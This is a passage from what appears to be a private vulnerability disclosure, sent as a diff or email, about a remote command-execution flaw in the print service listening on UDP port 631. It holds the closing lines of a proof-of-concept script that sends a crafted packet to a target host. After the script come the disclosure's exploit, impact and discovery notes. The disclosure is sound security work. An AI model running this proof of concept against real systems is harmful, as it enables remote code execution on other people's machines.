+	).start()
+
+	TARGET_HOST = sys.argv[2]
+	TARGET_PORT = 631
+	send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)
+
+	print("wating ...")
+
+	while True:
+		time.sleep(1.0)
+
+```
+
+Exploit: An attacker can exploit this vulnerability if it can connect to the host via UDP port 631, which is by default bound to INADDR_ANY, in which case the attack can be entirely remote, or if it's on the same network of the target, by using mDNS advertisements.
+
+Impact: Remote execution of arbitrary commands when a print job is sent to the system printer.
+
+Discovery: A lot of curiosity (when I noticed the *:631 UDP bind I was like "wtf is this?!" and went down a rabbit hole ...) and good old source code auditing.
+
+Has been exploited? no
+
+Is public? no{quote}
+
+Disclosure Plans? yes
+--gKMricLos+KVdGMg--
